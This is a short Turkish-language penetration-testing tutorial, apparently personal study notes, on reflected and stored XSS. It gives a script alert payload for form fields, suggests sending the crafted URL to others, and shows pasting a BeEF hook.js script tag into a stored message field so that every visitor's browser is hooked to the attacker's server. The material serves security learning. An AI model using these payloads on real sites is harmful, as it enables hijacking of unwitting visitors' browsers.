# XSS Açıkları

#### XSS açıkları site içinde JS kodu çalıştırabiliyoruz demektir

> ## XSS Reflected

#### Bir link oluşturmamız gerekiyor 
#### Site içinde site ile etkileşime girebileceğimiz yer arıyoruz 
![](https://github.com/ahmetnuysal/Cyber-Security/blob/b8d58a9d2f710cb023f9ac0dbb2d83c22e457eba/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-30%20at%2013.39.08.jpeg)
#### Bu kısıma ```<script>alert("ı hack you")</script>``` yazıyoruz ve submit ediyoruz
![](https://github.com/ahmetnuysal/Cyber-Security/blob/f7a0ec1433d1e05fd007503381c54e818cfce8e6/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-30%20at%2013.42.12.jpeg)
#### Eğer birisine sitenin ```url```sini yollarsak yolladığımız kişininde ekranında bu bildirimi görürüz

> ## XXS Stored
#### Bu sefer form siteleri benzeri bir etkileşim yeri buluyoruz
![](https://github.com/ahmetnuysal/Cyber-Security/blob/41454e2cfb3fb9afae9f262e08f50311f927397e/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-30%20at%2014.03.03.jpeg)
#### Rastgele bir isim giriyoruz, mesaj kısmına ```<script>alert("ı hack you")</script>``` yazıyoruz ve submit ediyoruz
![](https://github.com/ahmetnuysal/Cyber-Security/blob/9991c76b35828899d62e508174455d796dc28ba0/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-30%20at%2014.05.40.jpeg)
#### Mesajımızı siteye giren herkes göreceği için bu sayfaya giren herkesin ekranında ```ı hack you``` mesajı görülecek
![](https://github.com/ahmetnuysal/Cyber-Security/blob/f7a0ec1433d1e05fd007503381c54e818cfce8e6/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-30%20at%2013.42.12.jpeg)
> ## XSS Stored ve Beef Çalıştırma
#### ```beef-xss``` ile beef'i açıyoruz
#### ```example``` kısmınıdaki ```<script src="http://.../hook.js"></script>```kodunu kopyalıyoruz ve sitemize geri dönüyoruz
#### Bu kodu mesaj kısımına yapıştırıp submit ediyoruz
#### Artık bu siteye giren herkes hook'umuza takılmış olucak ve ```beef``` üzerinden bize görünür olucak
